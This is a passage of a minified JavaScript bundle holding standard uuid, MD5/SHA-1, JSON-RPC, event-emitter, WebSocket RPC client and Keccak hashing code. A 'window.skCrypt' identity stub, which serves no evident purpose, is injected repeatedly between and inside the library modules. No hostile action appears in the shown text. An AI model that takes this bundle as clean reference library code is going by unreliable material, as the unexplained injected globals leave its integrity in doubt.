        (s[8] = (63 & s[8]) | 128),
        o)
      ) {
        i = i || 0;
        for (var a = 0; a < 16; ++a) o[i + a] = s[a];
        return o;
      }
      return Ao(s);
    }
    try {
      r.name = t;
    } catch (o) {}
    return (
      (r.DNS = "6ba7b810-9dad-11d1-80b4-00c04fd430c8"),
      (r.URL = "6ba7b811-9dad-11d1-80b4-00c04fd430c8"),
      r
    );
  }
  function To(t) {
    return 14 + (((t + 64) >>> 9) << 4) + 1;
  }
  function Co(t, e) {
    var n = (65535 & t) + (65535 & e);
    return (((t >> 16) + (e >> 16) + (n >> 16)) << 16) | (65535 & n);
  }
  function Bo(t, e, n, r, o, i) {
    return Co(((s = Co(Co(e, t), Co(r, i))) << (a = o)) | (s >>> (32 - a)), n);
    var s, a;
  }
  function Eo(t, e, n, r, o, i, s) {
    return Bo((e & n) | (~e & r), t, e, o, i, s);
  }
  function xo(t, e, n, r, o, i, s) {
    return Bo((e & r) | (n & ~r), t, e, o, i, s);
  }
  function Po(t, e, n, r, o, i, s) {
    return Bo(e ^ n ^ r, t, e, o, i, s);
  }
  function Ro(t, e, n, r, o, i, s) {
    return Bo(n ^ (e | ~r), t, e, o, i, s);
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  var Oo = _o("v3", 48, function (t) {
    if ("string" == typeof t) {
      var e = unescape(encodeURIComponent(t));
      t = new Uint8Array(e.length);
      for (var n = 0; n < e.length; ++n) t[n] = e.charCodeAt(n);
    }
    return (function (t) {
      for (
        var e = [], n = 32 * t.length, r = "0123456789abcdef", o = 0;
        o < n;
        o += 8
      ) {
        var i = (t[o >> 5] >>> o % 32) & 255,
          s = parseInt(r.charAt((i >>> 4) & 15) + r.charAt(15 & i), 16);
        e.push(s);
      }
      return e;
    })(
      (function (t, e) {
        (t[e >> 5] |= 128 << e % 32), (t[To(e) - 1] = e);
        for (
          var n = 1732584193,
            r = -271733879,
            o = -1732584194,
            i = 271733878,
            s = 0;
          s < t.length;
          s += 16
        ) {
          var a = n,
            u = r,
            c = o,
            l = i;
          (n = Eo(n, r, o, i, t[s], 7, -680876936)),
            (i = Eo(i, n, r, o, t[s + 1], 12, -389564586)),
            (o = Eo(o, i, n, r, t[s + 2], 17, 606105819)),
            (r = Eo(r, o, i, n, t[s + 3], 22, -1044525330)),
            (n = Eo(n, r, o, i, t[s + 4], 7, -176418897)),
            (i = Eo(i, n, r, o, t[s + 5], 12, 1200080426)),
            (o = Eo(o, i, n, r, t[s + 6], 17, -1473231341)),
            (r = Eo(r, o, i, n, t[s + 7], 22, -45705983)),
            (n = Eo(n, r, o, i, t[s + 8], 7, 1770035416)),
            (i = Eo(i, n, r, o, t[s + 9], 12, -1958414417)),
            (o = Eo(o, i, n, r, t[s + 10], 17, -42063)),
            (r = Eo(r, o, i, n, t[s + 11], 22, -1990404162)),
            (n = Eo(n, r, o, i, t[s + 12], 7, 1804603682)),
            (i = Eo(i, n, r, o, t[s + 13], 12, -40341101)),
            (o = Eo(o, i, n, r, t[s + 14], 17, -1502002290)),
            (n = xo(
              n,
              (r = Eo(r, o, i, n, t[s + 15], 22, 1236535329)),
              o,
              i,
              t[s + 1],
              5,
              -165796510
            )),
            (i = xo(i, n, r, o, t[s + 6], 9, -1069501632)),
            (o = xo(o, i, n, r, t[s + 11], 14, 643717713)),
            (r = xo(r, o, i, n, t[s], 20, -373897302)),
            (n = xo(n, r, o, i, t[s + 5], 5, -701558691)),
            (i = xo(i, n, r, o, t[s + 10], 9, 38016083)),
            (o = xo(o, i, n, r, t[s + 15], 14, -660478335)),
            (r = xo(r, o, i, n, t[s + 4], 20, -405537848)),
            (n = xo(n, r, o, i, t[s + 9], 5, 568446438)),
            (i = xo(i, n, r, o, t[s + 14], 9, -1019803690)),
            (o = xo(o, i, n, r, t[s + 3], 14, -187363961)),
            (r = xo(r, o, i, n, t[s + 8], 20, 1163531501)),
            (n = xo(n, r, o, i, t[s + 13], 5, -1444681467)),
            (i = xo(i, n, r, o, t[s + 2], 9, -51403784)),
            (o = xo(o, i, n, r, t[s + 7], 14, 1735328473)),
            (n = Po(
              n,
              (r = xo(r, o, i, n, t[s + 12], 20, -1926607734)),
              o,
              i,
              t[s + 5],
              4,
              -378558
            )),
            (i = Po(i, n, r, o, t[s + 8], 11, -2022574463)),
            (o = Po(o, i, n, r, t[s + 11], 16, 1839030562)),
            (r = Po(r, o, i, n, t[s + 14], 23, -35309556)),
            (n = Po(n, r, o, i, t[s + 1], 4, -1530992060)),
            (i = Po(i, n, r, o, t[s + 4], 11, 1272893353)),
            (o = Po(o, i, n, r, t[s + 7], 16, -155497632)),
            (r = Po(r, o, i, n, t[s + 10], 23, -1094730640)),
            (n = Po(n, r, o, i, t[s + 13], 4, 681279174)),
            (i = Po(i, n, r, o, t[s], 11, -358537222)),
            (o = Po(o, i, n, r, t[s + 3], 16, -722521979)),
            (r = Po(r, o, i, n, t[s + 6], 23, 76029189)),
            (n = Po(n, r, o, i, t[s + 9], 4, -640364487)),
            (i = Po(i, n, r, o, t[s + 12], 11, -421815835)),
            (o = Po(o, i, n, r, t[s + 15], 16, 530742520)),
            (n = Ro(
              n,
              (r = Po(r, o, i, n, t[s + 2], 23, -995338651)),
              o,
              i,
              t[s],
              6,
              -198630844
            )),
            (i = Ro(i, n, r, o, t[s + 7], 10, 1126891415)),
            (o = Ro(o, i, n, r, t[s + 14], 15, -1416354905)),
            (r = Ro(r, o, i, n, t[s + 5], 21, -57434055)),
            (n = Ro(n, r, o, i, t[s + 12], 6, 1700485571)),
            (i = Ro(i, n, r, o, t[s + 3], 10, -1894986606)),
            (o = Ro(o, i, n, r, t[s + 10], 15, -1051523)),
            (r = Ro(r, o, i, n, t[s + 1], 21, -2054922799)),
            (n = Ro(n, r, o, i, t[s + 8], 6, 1873313359)),
            (i = Ro(i, n, r, o, t[s + 15], 10, -30611744)),
            (o = Ro(o, i, n, r, t[s + 6], 15, -1560198380)),
            (r = Ro(r, o, i, n, t[s + 13], 21, 1309151649)),
            (n = Ro(n, r, o, i, t[s + 4], 6, -145523070)),
            (i = Ro(i, n, r, o, t[s + 11], 10, -1120210379)),
            (o = Ro(o, i, n, r, t[s + 2], 15, 718787259)),
            (r = Ro(r, o, i, n, t[s + 9], 21, -343485551)),
            (n = Co(n, a)),
            (r = Co(r, u)),
            (o = Co(o, c)),
            (i = Co(i, l));
        }
        return [n, r, o, i];
      })(
        (function (t) {
          if (0 === t.length) return [];
          for (
            var e = 8 * t.length, n = new Uint32Array(To(e)), r = 0;
            r < e;
            r += 8
          )
            n[r >> 5] |= (255 & t[r / 8]) << r % 32;
          return n;
        })(t),
        8 * t.length
      )
    );
  });
  function Mo(t, e, n, r) {
    switch (t) {
      case 0:
        return (e & n) ^ (~e & r);
      case 1:
      case 3:
        return e ^ n ^ r;
      case 2:
        return (e & n) ^ (e & r) ^ (n & r);
    }
  }
  function Lo(t, e) {
    return (t << e) | (t >>> (32 - e));
  }
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  var No = _o("v5", 80, function (t) {
    var e = [1518500249, 1859775393, 2400959708, 3395469782],
      n = [1732584193, 4023233417, 2562383102, 271733878, 3285377520];
    if ("string" == typeof t) {
      var r = unescape(encodeURIComponent(t));
      t = [];
      for (var o = 0; o < r.length; ++o) t.push(r.charCodeAt(o));
    } else Array.isArray(t) || (t = Array.prototype.slice.call(t));
    t.push(128);
    for (
      var i = t.length / 4 + 2, s = Math.ceil(i / 16), a = new Array(s), u = 0;
      u < s;
      ++u
    ) {
      for (var c = new Uint32Array(16), l = 0; l < 16; ++l)
        c[l] =
          (t[64 * u + 4 * l] << 24) |
          (t[64 * u + 4 * l + 1] << 16) |
          (t[64 * u + 4 * l + 2] << 8) |
          t[64 * u + 4 * l + 3];
      a[u] = c;
    }
    (a[s - 1][14] = (8 * (t.length - 1)) / Math.pow(2, 32)),
      (a[s - 1][14] = Math.floor(a[s - 1][14])),
      (a[s - 1][15] = (8 * (t.length - 1)) & 4294967295);
    for (var d = 0; d < s; ++d) {
      for (var f = new Uint32Array(80), h = 0; h < 16; ++h) f[h] = a[d][h];
      for (var p = 16; p < 80; ++p)
        f[p] = Lo(f[p - 3] ^ f[p - 8] ^ f[p - 14] ^ f[p - 16], 1);
      for (
        var m = n[0], g = n[1], y = n[2], w = n[3], b = n[4], v = 0;
        v < 80;
        ++v
      ) {
        var A = Math.floor(v / 20),
          k = (Lo(m, 5) + Mo(A, g, y, w) + b + e[A] + f[v]) >>> 0;
        (b = w), (w = y), (y = Lo(g, 30) >>> 0), (g = m), (m = k);
      }
      (n[0] = (n[0] + m) >>> 0),
        (n[1] = (n[1] + g) >>> 0),
        (n[2] = (n[2] + y) >>> 0),
        (n[3] = (n[3] + w) >>> 0),
        (n[4] = (n[4] + b) >>> 0);
    }
    return [
      (n[0] >> 24) & 255,
      (n[0] >> 16) & 255,
      (n[0] >> 8) & 255,
      255 & n[0],
      (n[1] >> 24) & 255,
      (n[1] >> 16) & 255,
      (n[1] >> 8) & 255,
      255 & n[1],
      (n[2] >> 24) & 255,
      (n[2] >> 16) & 255,
      (n[2] >> 8) & 255,
      255 & n[2],
      (n[3] >> 24) & 255,
      (n[3] >> 16) & 255,
      (n[3] >> 8) & 255,
      255 & n[3],
      (n[4] >> 24) & 255,
      (n[4] >> 16) & 255,
      (n[4] >> 8) & 255,
      255 & n[4],
    ];
  });
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  (window.skCrypt = function (t) {
    return function () {
      return t;
    };
  }),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const Do = Object.freeze(
      Object.defineProperty(
        {
          __proto__: null,
          NIL: "00000000-0000-0000-0000-000000000000",
          parse: So,
          stringify: Ao,
          v1: function (t, e, n) {
            var r = (e && n) || 0,
              o = e || new Array(16),
              i = (t = t || {}).node || yo,
              s = void 0 !== t.clockseq ? t.clockseq : wo;
            if (null == i || null == s) {
              var a = t.random || (t.rng || po)();
              null == i && (i = yo = [1 | a[0], a[1], a[2], a[3], a[4], a[5]]),
                null == s && (s = wo = 16383 & ((a[6] << 8) | a[7]));
            }
            var u = void 0 !== t.msecs ? t.msecs : Date.now(),
              c = void 0 !== t.nsecs ? t.nsecs : Io + 1,
              l = u - ko + (c - Io) / 1e4;
            if (
              (l < 0 && void 0 === t.clockseq && (s = (s + 1) & 16383),
              (l < 0 || u > ko) && void 0 === t.nsecs && (c = 0),
              c >= 1e4)
            )
              throw new Error(
                "uuid.v1(): Can't create more than 10M uuids/sec"
              );
            (ko = u), (Io = c), (wo = s);
            var d = (1e4 * (268435455 & (u += 122192928e5)) + c) % 4294967296;
            (o[r++] = (d >>> 24) & 255),
              (o[r++] = (d >>> 16) & 255),
              (o[r++] = (d >>> 8) & 255),
              (o[r++] = 255 & d);
            var f = ((u / 4294967296) * 1e4) & 268435455;
            (o[r++] = (f >>> 8) & 255),
              (o[r++] = 255 & f),
              (o[r++] = ((f >>> 24) & 15) | 16),
              (o[r++] = (f >>> 16) & 255),
              (o[r++] = (s >>> 8) | 128),
              (o[r++] = 255 & s);
            for (var h = 0; h < 6; ++h) o[r + h] = i[h];
            return e || Ao(o);
          },
          v3: Oo,
          v4: function (t, e, n) {
            var r = (t = t || {}).random || (t.rng || po)();
            if (((r[6] = (15 & r[6]) | 64), (r[8] = (63 & r[8]) | 128), e)) {
              n = n || 0;
              for (var o = 0; o < 16; ++o) e[n + o] = r[o];
              return e;
            }
            return Ao(r);
          },
          v5: No,
          validate: go,
          version: function (t) {
            if (!go(t)) throw TypeError("Invalid UUID");
            return parseInt(t.substr(14, 1), 16);
          },
        },
        Symbol.toStringTag,
        { value: "Module" }
      )
    ),
    Uo = Wn(Do);
  var qo, Wo, zo, Ko;
  var Fo = (function () {
    if (Ko) return zo;
    (Ko = 1),
      (window.skCrypt = function (t) {
        return function () {
          return t;
        };
      });
    const t = Uo.v4,
      e = (function () {
        if (Wo) return qo;
        (Wo = 1),
          (window.skCrypt = function (t) {
            return function () {
              return t;
            };
          });
        const t = Uo.v4;
        return (qo = function (e, n, r, o) {
          if ("string" != typeof e)
            throw new TypeError(e + " must be a string");
          const i = "number" == typeof (o = o || {}).version ? o.version : 2;
          if (1 !== i && 2 !== i) throw new TypeError(i + " must be 1 or 2");
          const s = { method: e };
          if ((2 === i && (s.jsonrpc = "2.0"), n)) {
            if ("object" != typeof n && !Array.isArray(n))
              throw new TypeError(n + " must be an object, array or omitted");
            s.params = n;
          }
          if (void 0 === r) {
            const e =
              "function" == typeof o.generator
                ? o.generator
                : function () {
                    return t();
                  };
            s.id = e(s, o);
          } else
            2 === i && null === r
              ? o.notificationIdNull && (s.id = null)
              : (s.id = r);
          return s;
        });
      })(),
      n = function (e, r) {
        if (!(this instanceof n)) return new n(e, r);
        r || (r = {}),
          (this.options = {
            reviver: void 0 !== r.reviver ? r.reviver : null,
            replacer: void 0 !== r.replacer ? r.replacer : null,
            generator:
              void 0 !== r.generator
                ? r.generator
                : function () {
                    return t();
                  },
            version: void 0 !== r.version ? r.version : 2,
            notificationIdNull:
              "boolean" == typeof r.notificationIdNull && r.notificationIdNull,
          }),
          (this.callServer = e);
      };
    return (
      (zo = n),
      (n.prototype.request = function (t, n, r, o) {
        const i = this;
        let s = null;
        const a = Array.isArray(t) && "function" == typeof n;
        if (1 === this.options.version && a)
          throw new TypeError("JSON-RPC 1.0 does not support batching");
        if (a || (!a && t && "object" == typeof t && "function" == typeof n))
          (o = n), (s = t);
        else {
          "function" == typeof r && ((o = r), (r = void 0));
          const i = "function" == typeof o;
          try {
            s = e(t, n, r, {
              generator: this.options.generator,
              version: this.options.version,
              notificationIdNull: this.options.notificationIdNull,
            });
          } catch (c) {
            if (i) return o(c);
            throw c;
          }
          if (!i) return s;
        }
        let u;
        try {
          u = JSON.stringify(s, this.options.replacer);
        } catch (c) {
          return o(c);
        }
        return (
          this.callServer(u, function (t, e) {
            i._parseResponse(t, e, o);
          }),
          s
        );
      }),
      (n.prototype._parseResponse = function (t, e, n) {
        if (t) return n(t), void 0;
        if (!e) return n();
        let r;
        try {
          r = JSON.parse(e, this.options.reviver);
        } catch (o) {
          return n(o);
        }
        if (3 === n.length) {
          if (Array.isArray(r)) {
            const t = function (t) {
                return void 0 !== t.error;
              },
              e = function (e) {
                return !t(e);
              };
            return n(null, r.filter(t), r.filter(e));
          }
          return n(null, r.error, r.result);
        }
        n(null, r);
      }),
      zo
    );
  })();
  const jo = Un(Fo);
  var Go,
    Vo = { exports: {} };
  var Ho =
    (Go ||
      ((Go = 1),
      (function (t) {
        window.skCrypt = function (t) {
          return function () {
            return t;
          };
        };
        var e = Object.prototype.hasOwnProperty,
          n = "~";
        function r() {}
        function o(t, e, n) {
          (this.fn = t), (this.context = e), (this.once = n || !1);
        }
        function i(t, e, r, i, s) {
          if ("function" != typeof r)
            throw new TypeError("The listener must be a function");
          var a = new o(r, i || t, s),
            u = n ? n + e : e;
          return (
            t._events[u]
              ? t._events[u].fn
                ? (t._events[u] = [t._events[u], a])
                : t._events[u].push(a)
              : ((t._events[u] = a), t._eventsCount++),
            t
          );
        }
        function s(t, e) {
          0 === --t._eventsCount ? (t._events = new r()) : delete t._events[e];
        }
        function a() {
          (this._events = new r()), (this._eventsCount = 0);
        }
        Object.create &&
          ((r.prototype = Object.create(null)), new r().__proto__ || (n = !1)),
          (a.prototype.eventNames = function () {
            var t,
              r,
              o = [];
            if (0 === this._eventsCount) return o;
            for (r in (t = this._events))
              e.call(t, r) && o.push(n ? r.slice(1) : r);
            return Object.getOwnPropertySymbols
              ? o.concat(Object.getOwnPropertySymbols(t))
              : o;
          }),
          (a.prototype.listeners = function (t) {
            var e = n ? n + t : t,
              r = this._events[e];
            if (!r) return [];
            if (r.fn) return [r.fn];
            for (var o = 0, i = r.length, s = new Array(i); o < i; o++)
              s[o] = r[o].fn;
            return s;
          }),
          (a.prototype.listenerCount = function (t) {
            var e = n ? n + t : t,
              r = this._events[e];
            return r ? (r.fn ? 1 : r.length) : 0;
          }),
          (a.prototype.emit = function (t, e, r, o, i, s) {
            var a = n ? n + t : t;
            if (!this._events[a]) return !1;
            var u,
              c,
              l = this._events[a],
              d = arguments.length;
            if (l.fn) {
              switch ((l.once && this.removeListener(t, l.fn, void 0, !0), d)) {
                case 1:
                  return l.fn.call(l.context), !0;
                case 2:
                  return l.fn.call(l.context, e), !0;
                case 3:
                  return l.fn.call(l.context, e, r), !0;
                case 4:
                  return l.fn.call(l.context, e, r, o), !0;
                case 5:
                  return l.fn.call(l.context, e, r, o, i), !0;
                case 6:
                  return l.fn.call(l.context, e, r, o, i, s), !0;
              }
              for (c = 1, u = new Array(d - 1); c < d; c++)
                u[c - 1] = arguments[c];
              l.fn.apply(l.context, u);
            } else {
              var f,
                h = l.length;
              for (c = 0; c < h; c++)
                switch (
                  (l[c].once && this.removeListener(t, l[c].fn, void 0, !0), d)
                ) {
                  case 1:
                    l[c].fn.call(l[c].context);
                    break;
                  case 2:
                    l[c].fn.call(l[c].context, e);
                    break;
                  case 3:
                    l[c].fn.call(l[c].context, e, r);
                    break;
                  case 4:
                    l[c].fn.call(l[c].context, e, r, o);
                    break;
                  default:
                    if (!u)
                      for (f = 1, u = new Array(d - 1); f < d; f++)
                        u[f - 1] = arguments[f];
                    l[c].fn.apply(l[c].context, u);
                }
            }
            return !0;
          }),
          (a.prototype.on = function (t, e, n) {
            return i(this, t, e, n, !1);
          }),
          (a.prototype.once = function (t, e, n) {
            return i(this, t, e, n, !0);
          }),
          (a.prototype.removeListener = function (t, e, r, o) {
            var i = n ? n + t : t;
            if (!this._events[i]) return this;
            if (!e) return s(this, i), this;
            var a = this._events[i];
            if (a.fn)
              a.fn !== e ||
                (o && !a.once) ||
                (r && a.context !== r) ||
                s(this, i);
            else {
              for (var u = 0, c = [], l = a.length; u < l; u++)
                (a[u].fn !== e ||
                  (o && !a[u].once) ||
                  (r && a[u].context !== r)) &&
                  c.push(a[u]);
              c.length
                ? (this._events[i] = 1 === c.length ? c[0] : c)
                : s(this, i);
            }
            return this;
          }),
          (a.prototype.removeAllListeners = function (t) {
            var e;
            return (
              t
                ? ((e = n ? n + t : t), this._events[e] && s(this, e))
                : ((this._events = new r()), (this._eventsCount = 0)),
              this
            );
          }),
          (a.prototype.off = a.prototype.removeListener),
          (a.prototype.addListener = a.prototype.on),
          (a.prefixed = n),
          (a.EventEmitter = a),
          (t.exports = a);
      })(Vo)),
    Vo.exports);
  const Xo = Un(Ho);
  var Zo = class extends Xo {
    constructor(t, n, r) {
      super(),
        e(this, "socket"),
        (this.socket = new window.WebSocket(t, r)),
        (this.socket.onopen = () => this.emit("open")),
        (this.socket.onmessage = (t) => this.emit("message", t.data)),
        (this.socket.onerror = (t) => this.emit("error", t)),
        (this.socket.onclose = (t) => {
          this.emit("close", t.code, t.reason);
        });
    }
    send(t, e, n) {
      const r = n || e;
      try {
        this.socket.send(t), r();
      } catch (o) {
        r(o);
      }
    }
    close(t, e) {
      this.socket.close(t, e);
    }
    addEventListener(t, e, n) {
      this.socket.addEventListener(t, e, n);
    }
  };
  var Jo = class {
      encode(t) {
        return JSON.stringify(t);
      }
      decode(t) {
        return JSON.parse(t);
      }
    },
    Yo = class extends Xo {
      constructor(
        t,
        n = "ws://localhost:8080",
        {
          autoconnect: r = !0,
          reconnect: o = !0,
          reconnect_interval: i = 1e3,
          max_reconnects: s = 5,
          ...a
        } = {},
        u,
        c
      ) {
        super(),
          e(this, "address"),
          e(this, "rpc_id"),
          e(this, "queue"),
          e(this, "options"),
          e(this, "autoconnect"),
          e(this, "ready"),
          e(this, "reconnect"),
          e(this, "reconnect_timer_id"),
          e(this, "reconnect_interval"),
          e(this, "max_reconnects"),
          e(this, "rest_options"),
          e(this, "current_reconnects"),
          e(this, "generate_request_id"),
          e(this, "socket"),
          e(this, "webSocketFactory"),
          e(this, "dataPack"),
          (this.webSocketFactory = t),
          (this.queue = {}),
          (this.rpc_id = 0),
          (this.address = n),
          (this.autoconnect = r),
          (this.ready = !1),
          (this.reconnect = o),
          (this.reconnect_timer_id = void 0),
          (this.reconnect_interval = i),
          (this.max_reconnects = s),
          (this.rest_options = a),
          (this.current_reconnects = 0),
          (this.generate_request_id =
            u ||
            (() =>
              "number" == typeof this.rpc_id
                ? ++this.rpc_id
                : Number(this.rpc_id) + 1)),
          (this.dataPack = c || new Jo()),
          this.autoconnect &&
            this._connect(this.address, {
              autoconnect: this.autoconnect,
              reconnect: this.reconnect,
              reconnect_interval: this.reconnect_interval,
              max_reconnects: this.max_reconnects,
              ...this.rest_options,
            });
      }
      connect() {
        this.socket ||
          this._connect(this.address, {
            autoconnect: this.autoconnect,
            reconnect: this.reconnect,
            reconnect_interval: this.reconnect_interval,
            max_reconnects: this.max_reconnects,
            ...this.rest_options,
          });
      }
      call(t, e, n, r) {
        return (
          r || "object" != typeof n || ((r = n), (n = null)),
          new Promise((o, i) => {
            if (!this.ready) return i(new Error("socket not ready"));
            const s = this.generate_request_id(t, e),
              a = { jsonrpc: "2.0", method: t, params: e || void 0, id: s };
            this.socket.send(this.dataPack.encode(a), r, (t) => {
              if (t) return i(t);
              (this.queue[s] = { promise: [o, i] }),
                n &&
                  (this.queue[s].timeout = setTimeout(() => {
                    delete this.queue[s], i(new Error("reply timeout"));
                  }, n));
            });
          })
        );
      }
      async login(t) {
        const e = await this.call("rpc.login", t);
        if (!e) throw new Error("authentication failed");
        return e;
      }
      async listMethods() {
        return await this.call("__listMethods");
      }
      notify(t, e) {
        return new Promise((n, r) => {
          if (!this.ready) return r(new Error("socket not ready"));
          const o = { jsonrpc: "2.0", method: t, params: e };
          this.socket.send(this.dataPack.encode(o), (t) => {
            if (t) return r(t);
            n();
          });
        });
      }
      async subscribe(t) {
        "string" == typeof t && (t = [t]);
        const e = await this.call("rpc.on", t);
        if ("string" == typeof t && "ok" !== e[t])
          throw new Error(
            "Failed subscribing to an event '" + t + "' with: " + e[t]
          );
        return e;
      }
      async unsubscribe(t) {
        "string" == typeof t && (t = [t]);
        const e = await this.call("rpc.off", t);
        if ("string" == typeof t && "ok" !== e[t])
          throw new Error("Failed unsubscribing from an event with: " + e);
        return e;
      }
      close(t, e) {
        this.socket.close(t || 1e3, e);
      }
      setAutoReconnect(t) {
        this.reconnect = t;
      }
      setReconnectInterval(t) {
        this.reconnect_interval = t;
      }
      setMaxReconnects(t) {
        this.max_reconnects = t;
      }
      _connect(t, e) {
        clearTimeout(this.reconnect_timer_id),
          (this.socket = this.webSocketFactory(t, e)),
          this.socket.addEventListener("open", () => {
            (this.ready = !0), this.emit("open"), (this.current_reconnects = 0);
          }),
          this.socket.addEventListener("message", ({ data: t }) => {
            t instanceof ArrayBuffer && (t = lt.from(t).toString());
            try {
              t = this.dataPack.decode(t);
            } catch (e) {
              return;
            }
            if (t.notification && this.listeners(t.notification).length) {
              if (!Object.keys(t.params).length)
                return this.emit(t.notification);
              const e = [t.notification];
              if (t.params.constructor === Object) e.push(t.params);
              else
                for (let n = 0; n < t.params.length; n++) e.push(t.params[n]);
              return Promise.resolve().then(() => {
                this.emit.apply(this, e);
              });
            }
            if (!this.queue[t.id])
              return t.method
                ? Promise.resolve().then(() => {
                    this.emit(t.method, null == t ? void 0 : t.params);
                  })
                : void 0;
            "error" in t == "result" in t &&
              this.queue[t.id].promise[1](
                new Error(
                  'Server response malformed. Response must include either "result" or "error", but not both.'
                )
              ),
              this.queue[t.id].timeout &&
                clearTimeout(this.queue[t.id].timeout),
              t.error
                ? this.queue[t.id].promise[1](t.error)
                : this.queue[t.id].promise[0](t.result),
              delete this.queue[t.id];
          }),
          this.socket.addEventListener("error", (t) => this.emit("error", t)),
          this.socket.addEventListener("close", ({ code: n, reason: r }) => {
            this.ready && setTimeout(() => this.emit("close", n, r), 0),
              (this.ready = !1),
              (this.socket = void 0),
              1e3 !== n &&
                (this.current_reconnects++,
                this.reconnect &&
                  (this.max_reconnects > this.current_reconnects ||
                    0 === this.max_reconnects) &&
                  (this.reconnect_timer_id = setTimeout(
                    () => this._connect(t, e),
                    this.reconnect_interval
                  )));
          });
      }
    };
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  const Qo = BigInt(0),
    $o = BigInt(1),
    ti = BigInt(2),
    ei = BigInt(7),
    ni = BigInt(256),
    ri = BigInt(113),
    oi = [],
    ii = [],
    si = [];
  for (let UO = 0, qO = $o, WO = 1, zO = 0; UO < 24; UO++) {
    ([WO, zO] = [zO, (2 * WO + 3 * zO) % 5]),
      oi.push(2 * (5 * zO + WO)),
      ii.push((((UO + 1) * (UO + 2)) / 2) % 64);
    let t = Qo;
    for (let e = 0; e < 7; e++)
      (qO = ((qO << $o) ^ ((qO >> ei) * ri)) % ni),
        qO & ti && (t ^= $o << (($o << BigInt(e)) - $o));
    si.push(t);
  }
  const ai = Vt(si, !0),
    ui = ai[0],
    ci = ai[1],
    li = (t, e, n) =>
      n > 32
        ? ((t, e, n) => (e << (n - 32)) | (t >>> (64 - n)))(t, e, n)
        : ((t, e, n) => (t << n) | (e >>> (32 - n)))(t, e, n),
    di = (t, e, n) =>
      n > 32
        ? ((t, e, n) => (t << (n - 32)) | (e >>> (64 - n)))(t, e, n)
        : ((t, e, n) => (e << n) | (t >>> (32 - n)))(t, e, n);
  class fi extends Lt {
    constructor(t, e, n, r = !1, o = 24) {
      if (
        (super(),
        (this.pos = 0),
        (this.posOut = 0),
        (this.finished = !1),
        (this.destroyed = !1),
        (this.enableXOF = !1),
        (this.blockLen = t),
        (this.suffix = e),
        (this.outputLen = n),
        (this.enableXOF = r),
        (this.rounds = o),
        ht(n),
        !(0 < t && t < 200))
      )
        throw new Error("only keccak-f1600 function is supported");
      var i;
      (this.state = new Uint8Array(200)),
        (this.state32 =
          ((i = this.state),
          new Uint32Array(
            i.buffer,
            i.byteOffset,
            Math.floor(i.byteLength / 4)
          )));
    }
    clone() {
      return this._cloneInto();
    }
    keccak() {
      At(this.state32),
        (function (t, e = 24) {
          const n = new Uint32Array(10);
          for (let r = 24 - e; r < 24; r++) {
            for (let r = 0; r < 10; r++)
              n[r] = t[r] ^ t[r + 10] ^ t[r + 20] ^ t[r + 30] ^ t[r + 40];
            for (let r = 0; r < 10; r += 2) {
              const e = (r + 8) % 10,
                o = (r + 2) % 10,
                i = n[o],
                s = n[o + 1],
                a = li(i, s, 1) ^ n[e],
                u = di(i, s, 1) ^ n[e + 1];
              for (let n = 0; n < 50; n += 10)
                (t[r + n] ^= a), (t[r + n + 1] ^= u);
            }
            let e = t[2],
              o = t[3];
            for (let n = 0; n < 24; n++) {
              const r = ii[n],
                i = li(e, o, r),
                s = di(e, o, r),
                a = oi[n];
              (e = t[a]), (o = t[a + 1]), (t[a] = i), (t[a + 1] = s);
            }
            for (let r = 0; r < 50; r += 10) {
              for (let e = 0; e < 10; e++) n[e] = t[r + e];
              for (let e = 0; e < 10; e++)
                t[r + e] ^= ~n[(e + 2) % 10] & n[(e + 4) % 10];
            }
            (t[0] ^= ui[r]), (t[1] ^= ci[r]);
          }
          yt(n);
        })(this.state32, this.rounds),
        At(this.state32),
        (this.posOut = 0),
        (this.pos = 0);
    }
    update(t) {
      mt(this), pt((t = Ot(t)));
      const { blockLen: e, state: n } = this,
        r = t.length;
      for (let o = 0; o < r; ) {
        const i = Math.min(e - this.pos, r - o);
        for (let e = 0; e < i; e++) n[this.pos++] ^= t[o++];
        this.pos === e && this.keccak();
      }
      return this;
    }
    finish() {
      if (this.finished) return;
      this.finished = !0;
      const { state: t, suffix: e, pos: n, blockLen: r } = this;
      (t[n] ^= e),
        128 & e && n === r - 1 && this.keccak(),
        (t[r - 1] ^= 128),
        this.keccak();
    }
    writeInto(t) {
      mt(this, !1), pt(t), this.finish();
      const e = this.state,
        { blockLen: n } = this;
      for (let r = 0, o = t.length; r < o; ) {
        this.posOut >= n && this.keccak();
        const i = Math.min(n - this.posOut, o - r);
        t.set(e.subarray(this.posOut, this.posOut + i), r),
          (this.posOut += i),
          (r += i);
      }
      return t;
    }
    xofInto(t) {
      if (!this.enableXOF)
        throw new Error("XOF is not possible for this instance");
      return this.writeInto(t);
    }
    xof(t) {
      return ht(t), this.xofInto(new Uint8Array(t));
    }
    digestInto(t) {
      if ((gt(t, this), this.finished))
        throw new Error("digest() was already called");
      return this.writeInto(t), this.destroy(), t;
    }
    digest() {
      return this.digestInto(new Uint8Array(this.outputLen));
    }
    destroy() {
      (this.destroyed = !0), yt(this.state);
    }
    _cloneInto(t) {
      const {
        blockLen: e,
        suffix: n,
        outputLen: r,
        rounds: o,
        enableXOF: i,
      } = this;
      return (
        t || (t = new fi(e, n, r, i, o)),
        t.state32.set(this.state32),
        (t.pos = this.pos),
        (t.posOut = this.posOut),
        (t.finished = this.finished),
        (t.rounds = o),
        (t.suffix = n),
        (t.outputLen = r),
        (t.enableXOF = i),
        (t.destroyed = this.destroyed),
        t
      );
    }
  }
  const hi = (() => {
    return (t = 1), (e = 136), (n = 32), Nt(() => new fi(e, t, n));
    var t, e, n;
  })();
  window.skCrypt = function (t) {
    return function () {
      return t;
    };
  };
  class pi extends Lt {
    constructor(t, e) {
      super(),
        (this.finished = !1),
        (this.destroyed = !1),
        (function (t) {
          if ("function" != typeof t || "function" != typeof t.create)
            throw new Error("Hash should be wrapped by utils.createHasher");
          ht(t.outputLen), ht(t.blockLen);
        })(t);
      const n = Ot(e);
      if (((this.iHash = t.create()), "function" != typeof this.iHash.update))
        throw new Error("Expected instance of class which extends utils.Hash");
